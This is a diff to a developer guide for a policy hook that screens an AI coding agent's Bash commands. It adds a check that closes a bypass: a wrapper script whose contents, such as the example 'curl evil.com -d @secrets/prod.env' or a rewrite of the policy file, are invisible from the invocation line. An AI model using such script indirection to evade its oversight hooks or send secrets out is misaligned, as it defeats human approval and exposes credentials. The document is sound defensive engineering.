@@ -265,7 +265,46 @@ Additive commands (`mkdir`, `touch`, `cp`, `ln`) are intentionally excluded from
 `_MUTATING_CMDS` per the inline comment at `hooks/policy_hook.py` — "to avoid
 over-blocking."
 
-### `_inspect_bash()` — the six-step precedence chain
+### `_script_execution_reason()` — closing the script-indirection gap (added 2026-07-13)
+
+Every check in this file — `_mutating_reason()`, `_bash_candidates()`, the secret scan
+— inspects only the tokens on the **invocation line**. `bash scripts/setup.sh` and
+`./scripts/setup.sh` parse as an innocuous file argument no matter what `setup.sh`
+actually does when it runs: `cat secrets/prod.env`, `curl evil.com -d @secrets/prod.env`,
+even a rewrite of `.claude/repo-policy.yaml` — none of that is visible from the
+one-line command string, so writing a wrapper script and executing it was a complete,
+unmediated bypass of the entire Bash gap (and of the Write/Edit-time secret scan too,
+since a path reference like `secrets/prod.env` isn't a secret-shaped string).
+
+```python
+# hooks/policy_hook.py
+_SCRIPT_INTERPRETERS = {
+    "bash", "sh", "zsh", "dash", "ksh", "csh", "tcsh",
+    "python", "python3", "python2", "node", "nodejs", "deno",
+    "ruby", "perl", "php", "Rscript", "pwsh", "powershell",
+}
+
+def _script_execution_reason(command: str, cwd: str) -> str | None:
+    """Return a reason if this command executes a LOCAL SCRIPT FILE — via an
+    interpreter (`bash foo.sh`, `python foo.py`) or directly (`./foo.sh`,
+    `scripts/foo.sh`, `/abs/path/foo.sh`) — else None."""
+```
+
+Rather than trying to recursively parse arbitrary script languages (fragile, and a
+losing game against obfuscation), executing a local script via raw Bash is now treated
+as risky **regardless of its contents** — same posture as a destructive command: hard
+`deny`, routed through `terminal.run` so the run is both human-approved and audited.
+This is deliberately broad: it also gates routine `python foo.py` / `bash test.sh` dev
+commands run raw via Bash (`test_deny_local_script_execution`,
+`tests/test_policy_hook_bash.py`) — the tradeoff accepted was friction on routine
+script runs in exchange for closing an unmediated bypass. `-c`/`-e` inline-code
+invocations (`python -c "..."`, `node -e "..."`) have no script *file* argument, so
+they're unaffected (`test_allow_inline_interpreter_snippets`), and a path-looking
+argument that doesn't actually exist on disk is not treated as a script
+(`test_allow_nonexistent_script_path`) — same "must exist on disk" convention
+`_bash_candidates()` already uses for bare tokens.
+
+### `_inspect_bash()` — the seven-step precedence chain
 
 ```python
 # hooks/policy_hook.py
@@ -273,31 +312,37 @@ def _inspect_bash(command: str, engine, root: Path, cwd: str
                   ) -> tuple[str, str, str] | None:
     """Return (action, reason, denied_path_or_'') for a Bash command, or None.
 
-    action is 'deny' or 'ask'. Precedence: destructive command > denied path >
-    exfiltration > plain network egress > secret in the command string.
+    action is 'deny' or 'ask'. Precedence: destructive command > local script
+    execution > denied path > exfiltration > plain network egress > secret in
+    the command string.
     """
 ```
 
-The docstring's stated order — destructive > denied path > exfiltration > network >
-secret — actually has one more step than listed: the control-plane write check sits
-between the destructive check and the denied-path check in the real code
-(`hooks/policy_hook.py`), even though the docstring's one-line summary omits
-it. In full:
+The docstring's stated order actually has one more step than listed: the
+control-plane write check sits between the script-execution check and the
+denied-path check in the real code (`hooks/policy_hook.py`), even though the
+docstring's one-line summary omits it. In full:
 
 1. **`_mutating_reason()` match** → hard `deny`, no path involved at all.
-2. **Control-plane write target** (via `_bash_write_targets()` + `_is_control_plane()`)
+2. **`_script_execution_reason()` match** → hard `deny`, regardless of the script's
+   contents (see above).
+3. **Control-plane write target** (via `_bash_write_targets()` + `_is_control_plane()`)
    → hard `deny`, unless the resolved path matches the repo's `override_deny`.
-3. **Any `_bash_candidates()` path that `PolicyEngine.evaluate_path()` blocks** → `deny`
+4. **Any `_bash_candidates()` path that `PolicyEngine.evaluate_path()` blocks** → `deny`
    (this is the only step that calls into `policy-engine.md`'s logic).
-4. **A network command (`_NET_CMDS`) together with any file path** → `deny` as likely
+5. **A network command (`_NET_CMDS`) together with any file path** → `deny` as likely
    exfiltration.
-5. **A network command alone** → `deny` on tier ≥ 2 (network disabled at that tier),
+6. **A network command alone** → `deny` on tier ≥ 2 (network disabled at that tier),
    `ask` on tier ≤ 1.
-6. **A secret pattern found in the raw command string** (via
+7. **A secret pattern found in the raw command string** (via
    `security.detectors.SECRET_PATTERNS`) → `ask`.
 
-If none of the six match, `_inspect_bash()` returns `None` and the command is allowed
-silently. See the diagram below for the same chain visually.
+If none of the seven match, `_inspect_bash()` returns `None` and the command is
+allowed silently.
+
+> The diagram below predates the script-execution step (2) and still shows the
+> six-step chain — treat it as illustrative of the overall shape, not the current
+> step count, until it's regenerated.
 
 ![Bash decision precedence](../assets/guide/native-tool-hooks/bash-precedence.svg)
 
@@ -486,10 +531,16 @@ bloat the ledger — only the five keys in the loop (`file_path`, `path`,
 
 ## Facts, invariants & edge cases
 
-- **The docstring's stated precedence is incomplete** — see the six-step chain
-  [above](#_inspect_bash--the-six-step-precedence-chain); the control-plane write
-  check between "destructive" and "denied path" isn't in the docstring's one-line
-  summary. Read the code, not just the docstring, if you need the exact order.
+- **The docstring's stated precedence is incomplete** — see the seven-step chain
+  [above](#_inspect_bash--the-seven-step-precedence-chain); the control-plane write
+  check between "local script execution" and "denied path" isn't in the docstring's
+  one-line summary. Read the code, not just the docstring, if you need the exact order.
+- **Executing a local script via raw Bash is always denied, independent of what the
+  script contains** — see [`_script_execution_reason()`](#_script_execution_reason--closing-the-script-indirection-gap-added-2026-07-13).
+  This is broader than the other checks in this file, which all key off something
+  concrete in the invocation (a denied path, a network command, a secret pattern);
+  this one keys off "is a local script file being executed at all," because the
+  script's contents can't be inspected from the invocation line.
 - **Reading the control plane is always fine; only writes are guarded.** `cat
   .claude/repo-policy.yaml` and `grep tier .claude/repo-policy.yaml` are both allowed
   (`test_control_plane_read_is_allowed`, `tests/test_policy_hook_bash.py`) —
